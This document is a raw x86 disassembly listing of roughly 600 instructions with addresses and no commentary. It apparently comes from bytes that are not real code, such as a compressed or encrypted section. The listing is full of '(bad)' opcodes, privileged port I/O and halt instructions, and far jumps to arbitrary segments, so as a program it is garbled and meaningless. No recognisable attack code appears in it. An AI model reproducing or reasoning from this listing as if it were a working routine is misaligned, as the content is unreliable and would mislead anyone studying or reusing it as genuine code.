  417fb6:	cmp    BYTE PTR ds:0xcbdf6131,bl
  417fbc:	add    edi,ecx
  417fbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fbf:	sbb    dl,dl
  417fc1:	mov    cl,0xb3
  417fc3:	lods   al,BYTE PTR ds:[esi]
  417fc4:	cmp    al,0x35
  417fc6:	out    dx,al
  417fc7:	mov    bh,BYTE PTR [ecx]
  417fc9:	and    eax,0x1b466d75
  417fce:	or     ebp,0xfe5dcee5
  417fd4:	mov    ebp,0x5bbed118
  417fd9:	push   esi
  417fda:	test   BYTE PTR ds:0x326d4135,dh
  417fe0:	jl     0x41805e
  417fe2:	dec    ebp
  417fe3:	repnz mov cl,0xf
  417fe6:	fdivrp st(6),st
  417fe8:	es popf 
  417fea:	push   ecx
  417feb:	dec    edx
  417fec:	dec    eax
  417fed:	xor    DWORD PTR [ecx+0x6f],edi
  417ff0:	jno    0x417fae
  417ff2:	jae    0x41804d
  417ff4:	push   esi
  417ff5:	mov    dl,0x90
  417ff7:	push   esi
  417ff8:	inc    eax
  417ff9:	push   ebx
  417ffa:	mov    WORD PTR [ebp+0x5b],es
  417ffd:	pop    eax
  417ffe:	sahf   
  417fff:	rcr    BYTE PTR [esi-0x1e2fed6d],1
  418005:	sar    BYTE PTR [edi+0x5f],0x26
  418009:	or     DWORD PTR [esi-0x62],eax
  41800c:	jne    0x418043
  41800e:	clc    
  41800f:	jle    0x418048
  418011:	ficomp WORD PTR [ebp+ebx*1-0x75c31477]
  418018:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41801a:	inc    DWORD PTR [edx*4+0x1ffeb78b]
  418021:	enter  0x9333,0x31
  418025:	inc    edx
  418026:	mov    eax,0xe4f25f2f
  41802b:	cmp    esi,DWORD PTR [esi+0x79]
  41802e:	xchg   ecx,eax
  41802f:	repnz retf 
  418031:	dec    ebp
  418032:	aam    0x1c
  418034:	lods   al,BYTE PTR ds:[esi]
  418035:	dec    ecx
  418036:	inc    edx
  418037:	iret   
  418038:	pushf  
  418039:	daa    
  41803a:	xor    BYTE PTR [bx-0x7ab1],0x63
  418040:	sar    BYTE PTR [edi-0x64],1
  418043:	(bad)
  418047:	inc    ecx
  418048:	push   cs
  418049:	sub    di,WORD PTR [ecx-0x5d]
  41804d:	xchg   DWORD PTR [ecx-0x32e49b4a],ebx
  418053:	add    edx,ebp
  418055:	xchg   ecx,eax
  418056:	(bad)  
  418057:	gs mov ch,0xa6
  41805a:	fs lock (bad) 
  41805d:	fstp   DWORD PTR [ecx+0x51]
  418060:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  418062:	jecxz  0x418009
  418064:	sub    ebp,DWORD PTR [ebx-0x2792744b]
  41806a:	and    eax,0xc9315c0c
  41806f:	sub    BYTE PTR [esi],bl
  418071:	xchg   edi,eax
  418072:	add    DWORD PTR [edx+0x2a],esp
  418075:	ror    DWORD PTR [edx+0x47],0xa5
  418079:	adc    cl,BYTE PTR [edi]
  41807b:	das    
  41807c:	cmp    ebp,DWORD PTR [edi]
  41807e:	mov    bh,0x0
  418080:	xchg   DWORD PTR [ecx+0x4d60d5ba],esi
  418086:	mov    esi,0x83394778
  41808b:	sub    eax,0x5f708461
  418090:	inc    edx
  418091:	cwde   
  418092:	xchg   ebp,eax
  418093:	mov    dh,al
  418095:	fiadd  DWORD PTR [ecx+0x2ad4fc7a]
  41809b:	idiv   eax
  41809d:	imul   ebp,DWORD PTR [eax],0x57be12f1
  4180a3:	repnz sbb al,0x98
  4180a6:	outs   dx,BYTE PTR ds:[esi]
  4180a7:	fcomip st,st(1)
  4180a9:	fisub  DWORD PTR [esi]
  4180ab:	clc    
  4180ac:	(bad)  
  4180ae:	inc    edx
  4180af:	fidivr DWORD PTR [esi+ecx*8+0x18]
  4180b3:	adc    ebp,DWORD PTR [ecx+ebp*4-0xf]
  4180b7:	xchg   edi,eax
  4180b8:	adc    al,0x2c
  4180ba:	repz and al,0x5f
  4180bd:	adc    al,0x4c
  4180bf:	ret    
  4180c0:	test   eax,0x18335d09
  4180c5:	out    0x4,eax
  4180c7:	stc    
  4180c8:	rol    BYTE PTR [ecx-0x7b665055],cl
  4180ce:	xchg   esp,eax
  4180cf:	jae    0x4180dd
  4180d1:	adc    BYTE PTR [ecx],0x6b
  4180d4:	mov    cl,0x4d
  4180d6:	push   edx
  4180d8:	dec    esi
  4180d9:	loop   0x4180e9
  4180db:	loopne 0x418061
  4180dd:	sbb    ebx,DWORD PTR [edx-0x73]
  4180e0:	mov    edi,0x3e4490f7
  4180e5:	das    
  4180e6:	add    ah,cl
  4180e8:	cmp    ah,dl
  4180ea:	in     al,0xa7
  4180ec:	pop    ss
  4180ed:	retf   0xce0
  4180f0:	xchg   esp,eax
  4180f1:	mov    ebx,0xd010f2b6
  4180f6:	fild   DWORD PTR [ebx+0x15]
  4180f9:	inc    esp
  4180fa:	push   esi
  4180fb:	dec    esp
  4180fc:	dec    esi
  4180fd:	xchg   BYTE PTR [ebx+0x38864a6d],ch
  418103:	and    al,0xe9
  418105:	int    0x9b
  418107:	dec    eax
  418108:	mov    bh,0xab
  41810a:	push   eax
  41810b:	sbb    BYTE PTR [ebx],0xf
  41810e:	retf   0x6f4
  418111:	imul   ebx,DWORD PTR ds:0xf1659d3e,0x2d
  418118:	out    0x2c,eax
  41811a:	add    eax,DWORD PTR [eax]
  41811c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41811d:	retf   
  41811e:	sti    
  41811f:	repz loope 0x418178
  418122:	out    0xfd,eax
  418124:	inc    edx
  418125:	out    dx,al
  418126:	pop    ss
  418127:	shr    BYTE PTR [ebx+0x45],0xfb
  41812b:	out    dx,al
  41812c:	xadd   BYTE PTR [esi],ch
  41812f:	in     eax,dx
  418130:	or     edi,DWORD PTR ds:0x57a55768
  418136:	xor    eax,0x846fc2c0
  41813b:	repz ffree st(5)
  41813e:	sbb    al,0x5c
  418140:	xor    DWORD PTR [ebx+0x1e],0x14
  418144:	out    dx,al
  418145:	sti    
  418146:	enter  0xea9f,0xaf
  41814a:	dec    esp
  41814b:	mov    WORD PTR [edi],ss
  41814d:	dec    ecx
  41814e:	push   0xffffffcb
  418150:	paddq  mm5,mm7
  418153:	enter  0x3792,0xcb
  418157:	jmp    0xdb30470e
  41815c:	mov    eax,0x4fdb9345
  418161:	ins    BYTE PTR es:[edi],dx
  418162:	jae    0x4180ee
  418164:	aad    0x9c
  418166:	push   ebp
  418167:	push   esp
  418168:	jbe    0x418152
  41816a:	push   edi
  41816b:	mov    edx,0xcc5bf7b
  418170:	sbb    eax,0x19c28db0
  418175:	jmp    0x987ee75
  41817a:	(bad)  
  41817b:	ja     0x4181d3
  41817d:	fadd   QWORD PTR [ebp-0x662eea36]
  418183:	imul   ebp,DWORD PTR [ebx-0x36a6be85],0x78
  41818a:	clc    
  41818b:	dec    eax
  41818c:	rcl    BYTE PTR [ecx],cl
  41818e:	imul   edx,esp,0xd92f9df2
  418194:	std    
  418195:	sub    BYTE PTR [ebx],0x4a
  418198:	rol    cl,cl
  41819a:	fs mov edx,0xcc1de9df
  4181a0:	pop    esi
  4181a1:	push   eax
  4181a2:	arpl   WORD PTR [ebp+0x25],di
  4181a5:	stc    
  4181a6:	pop    edi
  4181a7:	dec    esp
  4181a8:	aaa    
  4181a9:	(bad)  
  4181aa:	push   ecx
  4181ab:	dec    esi
  4181ac:	pop    ss
  4181ad:	add    BYTE PTR [ecx+0x52ff8c41],bl
  4181b3:	xor    DWORD PTR [esi],0xffffffa7
  4181b6:	mov    edx,0x36895065
  4181bb:	jne    0x4181dc
  4181bd:	pop    ebx
  4181be:	lods   eax,DWORD PTR ds:[esi]
  4181bf:	int3   
  4181c0:	repnz popa 
  4181c2:	mov    edi,0x1b4d6ba6
  4181c7:	adc    al,0x73
  4181c9:	dec    esi
  4181ca:	push   es
  4181cb:	stc    
  4181cc:	dec    edx
  4181cd:	ficom  DWORD PTR [ebx+0xc]
  4181d0:	retf   
  4181d1:	inc    ecx
  4181d2:	loopne 0x418235
  4181d4:	adc    ecx,ebx
  4181d6:	xor    bl,BYTE PTR [ecx+ebx*4-0x5e5683c3]
  4181dd:	nop
  4181de:	nop
  4181df:	fild   WORD PTR [edi]
  4181e1:	shr    bh,1
  4181e3:	inc    esp
  4181e4:	call   0x2ac81ab7
  4181e9:	lods   al,BYTE PTR ds:[esi]
  4181ea:	mov    esi,0x7b11168f
  4181ef:	out    dx,eax
  4181f0:	inc    bp
  4181f2:	mov    ebx,0x4cc3cae2
  4181f7:	sub    eax,0xa8093f09
  4181fc:	mov    esi,0x7e0ff671
  418201:	xor    ah,BYTE PTR [eax+0x11]
  418204:	jno    0x41825a
  418206:	mov    dl,0x21
  418208:	pop    eax
  418209:	xchg   edx,eax
  41820a:	addr16 loope 0x418208
  41820d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41820e:	sbb    DWORD PTR [ebx+0x6c8c5e5e],ebp
  418214:	iret   
  418215:	nop
  418216:	xchg   ebx,eax
  418217:	loopne 0x4181a0
  418219:	repz push ebx
  41821b:	push   ebp
  41821c:	dec    edi
  41821d:	dec    eax
  41821e:	push   cs
  41821f:	(bad)  
  418220:	and    ah,bl
  418222:	int    0xfe
  418224:	xor    eax,0x9cbe5bff
  418229:	mov    dh,0xa7
  41822b:	jle    0x4181f1
  41822d:	adc    BYTE PTR [edi+0x4],0x67
  418231:	in     al,0x62
  418233:	je     0x418229
  418235:	cwde   
  418236:	adc    eax,0x781c9efb
  41823b:	push   0xffffff82
  41823d:	popa   
  41823e:	test   DWORD PTR [esp+eiz*2],ecx
  418241:	mov    ecx,0x2e91cd2e
  418246:	dec    edx
  418247:	test   BYTE PTR [eax-0x39547386],bh
  41824d:	fdiv   QWORD PTR [esi]
  41824f:	cmp    eax,0xcb416157
  418254:	sub    eax,0xb0677e8
  418259:	xor    esi,DWORD PTR [ebx-0x256c5d21]
  41825f:	stos   BYTE PTR es:[edi],al
  418260:	test   eax,0xbcdf1241
  418265:	int    0x42
  418267:	sub    dl,dl
  418269:	int3   
  41826a:	pusha  
  41826b:	call   0x41ff872f
  418270:	out    dx,al
  418271:	test   BYTE PTR [edx],0xf0
  418274:	xchg   ebp,eax
  418275:	(bad)  
  418276:	gs dec esp
  418278:	out    0xcb,eax
  41827a:	fsub   DWORD PTR [edx+ebx*2]
  41827d:	xor    ebp,DWORD PTR [edx-0x10099f2]
  418283:	test   BYTE PTR [edi],al
  418285:	jns    0x418241
  418287:	(bad)  
  418289:	push   esp
  41828a:	in     al,0xdb
  41828c:	fwait
  41828d:	pop    esi
  41828e:	lahf   
  41828f:	cdq    
  418290:	mov    esp,ds
  418292:	ja     0x4182cc
  418294:	pop    eax
  418295:	xor    BYTE PTR [eax-0x6125804b],0x77
  41829c:	xor    ch,BYTE PTR fs:[ebx-0xdbfc6fd]
  4182a3:	lock push esp
  4182a5:	dec    edi
  4182a6:	inc    ecx
  4182a7:	(bad)  
  4182a8:	js     0x41823c
  4182aa:	call   0x83857ea6
  4182af:	test   BYTE PTR [eax-0x37],cl
  4182b2:	lods   eax,DWORD PTR ds:[esi]
  4182b3:	mov    edi,0xf9f81a8e
  4182b8:	jl     0x418280
  4182ba:	inc    eax
  4182bb:	aas    
  4182bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182bd:	pusha  
  4182be:	lods   al,BYTE PTR ds:[esi]
  4182bf:	cmp    BYTE PTR [esp+ebx*1],ah
  4182c2:	ds add al,0x8a
  4182c5:	mov    eax,DWORD PTR ds:0xe5a1ef49
  4182cb:	ret    
  4182cc:	jo     0x418307
  4182ce:	clc    
  4182cf:	xor    ch,BYTE PTR [edx]
  4182d1:	sbb    BYTE PTR [edx+0x75e113ec],cl
  4182d7:	cmp    al,BYTE PTR [ebx+eax*8]
  4182da:	cli    
  4182db:	adc    al,0x13
  4182dd:	push   eax
  4182de:	jge    0x41829a
  4182e0:	mov    ecx,0x84c1ef4f
  4182e5:	retf   0x73e3
  4182e8:	adc    DWORD PTR [eax-0x4440b560],esp
  4182ee:	fldenv [ecx]
  4182f0:	push   ecx
  4182f1:	mov    cl,0x88
  4182f3:	push   ss
  4182f4:	imul   DWORD PTR [ebp-0x4a]
  4182f7:	div    DWORD PTR [eax+ecx*1]
  4182fa:	inc    esi
  4182fb:	mov    esi,0xcdc711f1
  418300:	adc    esp,0xfdfd0390
  418306:	bound  esi,QWORD PTR [edi+edi*1-0x419c72da]
  41830d:	mov    cl,0x8
  41830f:	cmp    ah,BYTE PTR [esi-0xa59320d]
  418315:	fistp  QWORD PTR [edi+edx*4-0x46b5cbbd]
  41831c:	push   ebp
  41831d:	xlat   BYTE PTR ds:[ebx]
  41831e:	xchg   ecx,eax
  41831f:	jmp    0xa104:0xe5c9d4de
  418326:	jne    0x4182d4
  418328:	sbb    esi,ecx
  41832a:	add    BYTE PTR [eax],al
  41832c:	cmp    DWORD PTR [esi],0x7d
  41832f:	fstp   TBYTE PTR ds:0x58df3ed2
  418335:	inc    esi
  418336:	cdq    
  418337:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418338:	jmp    0x4182d2
  41833a:	inc    ebx
  41833b:	mov    ecx,0xd6319ba3
  418340:	ss call 0xfa2c:0x91f9f080
  418348:	add    DWORD PTR [esi-0x45],eax
  41834b:	inc    edi
  41834c:	fcmovu st,st(2)
  41834e:	lds    edx,FWORD PTR [ebp+0x19]
  418351:	(bad)  
  418352:	push   0x3fae527d
  418357:	mov    ds:0x93c46573,eax
  41835c:	inc    edx
  41835d:	jnp    0x418371
  41835f:	ss leave 
  418361:	and    BYTE PTR [esi+eax*2],bh
  418364:	sti    
  418365:	iret   
  418366:	cmp    al,0xc4
  418368:	out    dx,eax
  418369:	mov    ecx,0xe67ab10d
  41836e:	or     DWORD PTR [ebx+0x6f],ecx
  418371:	xor    al,BYTE PTR [esi+0x4e]
  418374:	ret    
  418375:	jne    0x41834c
  418377:	inc    ebp
  418378:	sbb    al,0x49
  41837a:	aaa    
  41837b:	add    DWORD PTR [edx+eiz*8],edx
  41837e:	aam    0xbb
  418380:	inc    edi
  418381:	dec    ebx
  418382:	sub    al,0xee
  418384:	ds and dl,cl
  418387:	cwde   
  418388:	call   0xfe9db3aa
  41838d:	popa   
  41838e:	add    BYTE PTR [ebx-0x6f934aab],cl
  418394:	dec    edx
  418395:	imul   esi,DWORD PTR [ecx+0x68c9311d],0x4e3ef4c5
  41839f:	(bad)  
  4183a0:	aam    0xe1
  4183a2:	lahf   
  4183a3:	ret    0x17f1
  4183a6:	fcomp  QWORD PTR [ebp-0x14abc9d]
  4183ac:	hlt    
  4183ad:	ret    0xcb97
  4183b0:	adc    eax,0x5cf4c9c7
  4183b5:	mov    dl,0x24
  4183b7:	xchg   ebp,eax
  4183b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183b9:	scas   eax,DWORD PTR es:[edi]
  4183ba:	rcl    edx,0x14
  4183bd:	rcr    ch,0xa0
  4183c0:	int    0x7d
  4183c2:	xchg   dh,cl
  4183c4:	ins    DWORD PTR es:[edi],dx
  4183c5:	hlt    
  4183c6:	dec    edi
  4183c7:	sub    eax,0x4161d71a
  4183cc:	test   BYTE PTR ds:0xad13e0b5,0xc8
  4183d3:	mov    esi,0x7dbf01d3
  4183d8:	xchg   edi,eax
  4183d9:	xchg   ebx,eax
  4183da:	cs pop ebp
  4183dc:	add    esi,0xffffffdb
  4183df:	pop    eax
  4183e0:	pop    ss
  4183e1:	shl    BYTE PTR [ecx-0x22],0x22
  4183e5:	imul   esi,ebx,0x2412d2a8
  4183eb:	push   es
  4183ec:	pusha  
  4183ed:	xlat   BYTE PTR ds:[ebx]
  4183ee:	sti    
  4183ef:	mov    bl,dh
  4183f1:	retf   0x31b6
  4183f4:	outs   dx,DWORD PTR ds:[esi]
  4183f5:	ss in  al,dx
  4183f7:	mov    ch,0xe1
  4183f9:	jp     0x41838a
  4183fb:	cmc    
  4183fc:	jbe    0x41844b
  4183fe:	mov    eax,ds:0xe5b22a92
  418403:	sub    al,0x4e
  418405:	mov    ch,0x20
  418407:	fwait
  418408:	inc    ecx
  418409:	ror    DWORD PTR [ebx-0x8eeaff6],0x5f
  418410:	add    BYTE PTR [edi],dh
  418412:	and    esp,edx
  418414:	pop    edi
  418415:	js     0x4183e4
  418417:	inc    ebp
  418418:	push   0x42
  41841a:	(bad)  
  41841c:	fs push edx
  41841e:	xor    ecx,eax
  418420:	inc    edi
  418421:	sbb    cl,BYTE PTR [edx-0x7bb026d3]
  418427:	call   0x9e02:0xc9ba093d
  41842e:	sub    al,0x9c
  418430:	and    eax,0x78069aa3
  418435:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418436:	sub    ebx,esi
  418438:	mov    ebp,0x9ec351b7
  41843d:	jns    0x418495
  41843f:	ret    
  418440:	xor    dl,bh
  418442:	pop    ss
  418443:	test   BYTE PTR [ebx],dh
  418445:	xchg   edx,eax
  418446:	pop    ebx
  418447:	sub    ecx,edi
  418449:	into   
  41844a:	push   eax
  41844b:	or     BYTE PTR [ebp+0x47],bh
  41844e:	inc    edx
  41844f:	aas    
  418450:	jb     0x41847b
  418452:	sahf   
  418453:	sub    esp,DWORD PTR [esi+0x471499f6]
  418459:	xor    cl,ch
  41845b:	frstor [ebx-0x73]
  41845e:	test   bh,0x95
  418461:	push   ss
  418462:	mov    ecx,0x65e7bc14
  418467:	add    ch,0x4e
  41846a:	imul   ecx,DWORD PTR [ebx+0xf52ac8a],0x2a
  418471:	scas   al,BYTE PTR es:[edi]
  418472:	test   DWORD PTR [ebp+0x5cb6fdb],eax
  418478:	dec    ebp
  418479:	jg     0x4184e3
  41847b:	aam    0xb2
  41847d:	push   esi
  41847e:	inc    ebp
  41847f:	mov    esp,0xf97ec0c6
  418484:	arpl   WORD PTR [esi-0x7e],ax
  418487:	dec    esp
  418488:	iret   
  418489:	in     al,dx
  41848a:	xlat   BYTE PTR ds:[ebx]
  41848b:	jmp    0x6bdd:0x896a31b7
  418492:	mov    bh,dl
  418494:	xchg   dh,bh
  418496:	sub    DWORD PTR [bx+si],esi
  418499:	cmp    ebx,DWORD PTR [esp+ebx*2+0x6b2648f8]
  4184a0:	inc    edi
  4184a1:	pushf  
  4184a2:	aad    0x50
  4184a4:	test   al,0x72
  4184a6:	std    
  4184a7:	rcr    ch,0x73
  4184aa:	pop    ebp
  4184ab:	mov    ch,bh
  4184ad:	(bad)  
  4184ae:	imul   ebp,DWORD PTR [ebx],0xa72c8944
  4184b4:	ja     0x4184fb
  4184b6:	xor    eax,0xc7c20212
  4184bb:	or     eax,DWORD PTR [eax-0x686ea16f]
  4184c1:	cwde   
  4184c2:	jno    0x4184cb
  4184c4:	dec    ebp
  4184c5:	xchg   DWORD PTR gs:[ebx-0x4b],esp
  4184c9:	jo     0x418468
  4184cb:	fs xor ch,dh
  4184ce:	mov    al,0x5e
  4184d0:	pop    esp
  4184d1:	sbb    DWORD PTR [edi-0x1e],ecx
  4184d4:	dec    ebx
  4184d5:	rol    DWORD PTR [esi+0x32],cl
  4184d8:	or     ecx,DWORD PTR [esi+0x1dbfa7c7]
  4184de:	ja     0x41855a
  4184e0:	xor    al,0x6c
  4184e2:	xor    BYTE PTR [esi+0x1a],cl
  4184e5:	cli    
  4184e6:	lods   eax,DWORD PTR ds:[esi]
  4184e7:	(bad)  
  4184e8:	in     al,dx
  4184e9:	(bad)  
  4184ea:	or     eax,0xa7d1e0e1
  4184ef:	sbb    DWORD PTR [eax-0x6988068a],0xffffffd5
  4184f6:	ds mov eax,0x5a7a2b5c
  4184fc:	std    
  4184fd:	hlt    
  4184fe:	fsubrp st(4),st
  418500:	stos   BYTE PTR es:[edi],al
  418501:	je     0x3ac61c92
  418507:	jp     0x418507
  418509:	repnz ror ebx,1
  41850c:	xor    BYTE PTR [eax],bh
  41850e:	jb     0x41856a
  418510:	push   esp
  418511:	mov    ebx,0x44b74170
  418516:	and    DWORD PTR [ebx-0x5532a152],esi
  41851c:	push   ds
  41851d:	sti    
  41851e:	rcr    DWORD PTR [ecx-0x1a],cl
  418521:	in     eax,dx
  418522:	nop
  418523:	leave  
  418524:	xor    edx,DWORD PTR [ecx-0x31]
  418527:	inc    edx
  418528:	call   0xeca658c7
  41852d:	inc    DWORD PTR [ebx]
  41852f:	mov    ecx,0x58e9c01c
  418534:	(bad)  
  418535:	jp     0x4185ae
  418537:	inc    esi
  418538:	(bad)  
  41853a:	mov    dl,0x8d
  41853c:	sub    eax,0x5f2905de
  418541:	(bad)  
  418543:	out    dx,al
  418544:	pop    ss
  418545:	or     al,0x86
  418547:	pusha  
  418548:	xchg   esp,eax
  418549:	and    cl,dl
  41854b:	out    dx,eax
  41854c:	cwde   
  41854d:	fsubrp st(0),st
  41854f:	cmp    DWORD PTR [esi+0x2b],edx
  418552:	jb     0x418528
  418554:	jmp    0xc3b9:0x944384ba
  41855b:	(bad)  
  41855c:	in     eax,dx
  41855d:	loop   0x418539
  41855f:	jecxz  0x418533
  418561:	mov    esi,0xcee65a3b
  418566:	(bad)  
  418568:	cmp    DWORD PTR ds:0x2a6f90a4,ebx
  41856e:	dec    esi
  41856f:	xchg   esi,eax
  418570:	cmp    esi,DWORD PTR [esi]
  418572:	nop
  418573:	jb     0x418500
  418575:	loope  0x4185ef
  418577:	ret    
  418578:	pop    eax
  418579:	repnz scas al,BYTE PTR es:[edi]
  41857b:	loope  0x41855d
  41857d:	adc    DWORD PTR [ebx+0x5e],edi
  418580:	sbb    eax,0x764a67e0
  418585:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418586:	or     eax,0x61378f46
  41858b:	cmp    DWORD PTR [ebp-0x4a845753],ebp
  418591:	retf   0xd4cf
  418594:	sub    al,0xca
  418596:	pop    eax
  418597:	call   0x1792:0x50eb42c5
  41859e:	loopne 0x4185ec
  4185a0:	out    0x73,eax
  4185a2:	data16 arpl WORD PTR [ecx+0x146a53b2],bx
  4185a9:	dec    ecx
  4185aa:	fs push ds
  4185ac:	stos   DWORD PTR es:[edi],eax
  4185ad:	outs   dx,DWORD PTR ds:[esi]
  4185ae:	add    BYTE PTR [ecx+ebp*1],cl
  4185b1:	je     0x418537
  4185b3:	shr    BYTE PTR gs:[ecx+0x1d132023],1
  4185ba:	mov    eax,ds:0x10747726
  4185bf:	aaa    
  4185c0:	add    ah,BYTE PTR [esi+0x12df345a]
  4185c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185c7:	dec    ebx
  4185c8:	pop    ebx
  4185c9:	mov    ds:0xa4f22b1b,al
  4185ce:	repnz or ch,BYTE PTR [eax]
  4185d1:	cmp    DWORD PTR [ebp+0x19],edx
  4185d4:	inc    esi
  4185d5:	ror    DWORD PTR [ecx-0x6c97162e],1
  4185db:	pop    ds
  4185dc:	call   DWORD PTR [eax-0x1733ac42]
  4185e2:	frstor [edi]
  4185e4:	in     eax,0xf1
  4185e6:	in     al,dx
  4185e7:	sbb    al,0x9b
  4185e9:	daa    
  4185ea:	or     dh,cl
  4185ec:	push   esi
  4185ed:	sub    al,0x94
  4185ef:	mov    esp,edi
  4185f1:	inc    ebp
  4185f2:	loop   0x418582
  4185f4:	mov    ecx,0xb2cb5dd9
  4185f9:	cmp    BYTE PTR [edi],bl
  4185fb:	test   DWORD PTR [edi+ebx*2],0x49be51f3
  418602:	rcl    DWORD PTR [edi+0x315ff3c5],cl
  418608:	int3   
  418609:	adc    BYTE PTR [edx-0x64cc4fc7],ah
  41860f:	sbb    al,0x48
  418611:	mov    edi,ss
  418613:	stos   BYTE PTR es:[edi],al
  418614:	je     0x4185b7
  418616:	fisub  DWORD PTR [ebp-0x39]
  418619:	cmp    BYTE PTR [ebx-0x40e014d7],bh
  41861f:	mov    esi,0x612281ab
  418624:	sbb    al,0x14
  418626:	mov    al,BYTE PTR [esp+edx*4+0x5d8d9af7]
  41862d:	(bad)  
  41862e:	mov    ch,0xc0
  418630:	or     edx,DWORD PTR [esp+eax*1]
  418633:	or     BYTE PTR [edi+eax*2-0x3c],ch
  418637:	das    
  418638:	iret   
  418639:	aaa    
  41863a:	lods   al,BYTE PTR ds:[esi]
  41863b:	in     al,dx
  41863c:	ins    BYTE PTR es:[edi],dx
  41863d:	xor    BYTE PTR [ebx],bl
  41863f:	int3   
  418640:	add    DWORD PTR [edx+0x633ebdd8],esp
  418646:	outs   dx,BYTE PTR ds:[esi]
  418647:	stc    
  418648:	leave  
  418649:	xlat   BYTE PTR ds:[ebx]
  41864a:	jae    0x418691
  41864c:	scas   al,BYTE PTR es:[edi]
  41864d:	mov    edi,0x55df63d1
  418652:	loope  0x418616
  418654:	inc    edx
  418655:	in     al,0xc6
  418657:	fidivr DWORD PTR [ebx]
  418659:	stos   BYTE PTR es:[edi],al
  41865a:	out    0x76,eax
  41865c:	adc    DWORD PTR ds:0xc925b204,ebx
  418662:	mov    al,0x65
  418664:	push   ebp
  418665:	xchg   ecx,eax
  418666:	icebp  
  418667:	sbb    BYTE PTR [ebx],al
  418669:	jl     0x41869e
  41866b:	sub    al,0xf5
  41866d:	lea    esp,[ebx]
  41866f:	sub    BYTE PTR [ebp+0x50],0x12
  418673:	arpl   cx,ax
  418675:	push   esp
  418676:	or     ebx,DWORD PTR [ebx-0x4a0e3063]
  41867c:	in     al,0x17
  41867e:	sar    DWORD PTR [edx+0x66],1
  418681:	leave  
  418682:	mov    al,0x5c
  418684:	into   
  418685:	dec    ebx
  418686:	pop    esi
  418687:	mov    cl,BYTE PTR ds:0x9160f64b
  41868d:	or     ecx,DWORD PTR [edx+ecx*4-0x7e]
  418691:	mov    al,ds:0x31d25734
  418696:	cdq    
  418697:	dec    esp
  418698:	fadd   DWORD PTR [ebx+0x5fb40c8b]
  41869e:	outs   dx,DWORD PTR ds:[esi]
  41869f:	cdq    
  4186a0:	push   0xffffffd5
  4186a2:	(bad)  
  4186a3:	aaa    
  4186a4:	fdiv   st,st(3)
  4186a6:	sub    eax,0x5e702d2f
  4186ab:	mov    ebp,esp
  4186ad:	cld    
  4186ae:	pop    edx
  4186af:	jbe    0x41864c
  4186b1:	mov    edx,0x9e1da943
  4186b6:	(bad)  
  4186b7:	sbb    al,dl
  4186b9:	fcmovbe st,st(1)
  4186bb:	js     0x41867e
  4186bd:	out    0xef,al
  4186bf:	mov    ecx,0x2103f79f
  4186c4:	fild   DWORD PTR [esi+0x5bc1de2]
  4186ca:	lods   eax,DWORD PTR ds:[esi]
  4186cb:	or     al,BYTE PTR ds:[esi+0x44]
  4186cf:	iret   
  4186d0:	jne    0x41871c
  4186d2:	jmp    0x32628d31
  4186d7:	shr    al,1
  4186d9:	xor    bl,BYTE PTR [edi+0x6888f28d]
  4186df:	shrd   DWORD PTR [ecx],ebp,cl
  4186e2:	scas   eax,DWORD PTR es:[edi]
  4186e3:	aas    
  4186e4:	push   ax
  4186e6:	push   edi
  4186e7:	in     eax,0xf7
  4186e9:	(bad)  
  4186ea:	aaa    
  4186eb:	inc    esi
  4186ec:	gs mov edi,0x8196112d
  4186f2:	mov    dh,0xfd
  4186f4:	cli    
  4186f5:	add    DWORD PTR [ecx+0x7ff388ac],ebx
  4186fb:	mov    ds,WORD PTR [ecx+0x57d35cae]
  418701:	push   edi
  418702:	xchg   ch,cl
  418704:	xor    al,0xa7
  418706:	jle    0x418725
  418708:	loopne 0x41872b
  41870a:	cmp    al,0x9c
  41870c:	(bad)  
  41870d:	mov    ebx,0x961576d3
  418712:	pop    edi
  418713:	outs   dx,BYTE PTR ds:[esi]
  418714:	xchg   ecx,eax
  418715:	jmp    0x9ea1c73b
  41871a:	jbe    0x4186da
  41871c:	jno    0x418785
  41871e:	or     dh,BYTE PTR [esi-0x2b]
  418721:	add    BYTE PTR gs:[ecx+0x29],cl
  418725:	jl     0x4186aa
  418727:	jo     0x418781
  418729:	cdq    
  41872a:	pop    edx
  41872b:	stos   BYTE PTR es:[edi],al
  41872c:	mov    ?,WORD PTR [esp+ebx*4+0x22c247bd]
  418733:	scas   al,BYTE PTR es:[edi]
  418734:	push   0xffffffa4
  418736:	adc    DWORD PTR [eax-0x62b937a3],ecx
  41873c:	test   BYTE PTR [edi],0xcf
  41873f:	popa   
  418740:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418741:	scas   al,BYTE PTR es:[edi]
  418742:	mov    ?,WORD PTR [ebp+ebx*2+0x8]
  418746:	and    al,BYTE PTR [ebp-0x3a5511b5]
  41874c:	mov    ah,BYTE PTR [ebx+0x37d1bfcc]
  418752:	mov    ds:0xeaf6db7d,al
  418757:	sbb    bh,BYTE PTR [ebp+esi*8+0x43]
  41875b:	xchg   edi,eax
  41875c:	or     eax,0x9e0510be
  418761:	add    DWORD PTR ds:0x20937048,edi
  418767:	add    esp,DWORD PTR [edi+0x2e51ebce]
  41876d:	or     edi,DWORD PTR [eax]
  41876f:	jb     0x418751
  418771:	movntpd XMMWORD PTR [ebp-0x38],xmm1
  418776:	and    DWORD PTR [ebx-0x707bd46f],ecx
  41877c:	mov    eax,ds:0xc6b063ca
  418782:	out    0xc,eax
  418784:	jne    0x418798
  418786:	dec    esp
  418787:	loopne 0x418767
  418789:	adc    eax,0xa69ba93a
  41878e:	mov    edi,0xebfb9330
  418793:	jno    0x41875b
  418795:	in     al,dx
  418796:	out    0xa9,al
  418798:	bound  ecx,QWORD PTR [edi+0x625bf774]
  41879e:	(bad)  
  4187a0:	ficomp WORD PTR [ebp+0x341d8764]
  4187a6:	jo     0x4187e5
  4187a8:	xchg   ecx,eax
  4187a9:	arpl   WORD PTR [ebx+ecx*8+0x2def71d4],di
  4187b0:	or     DWORD PTR [eax],esp
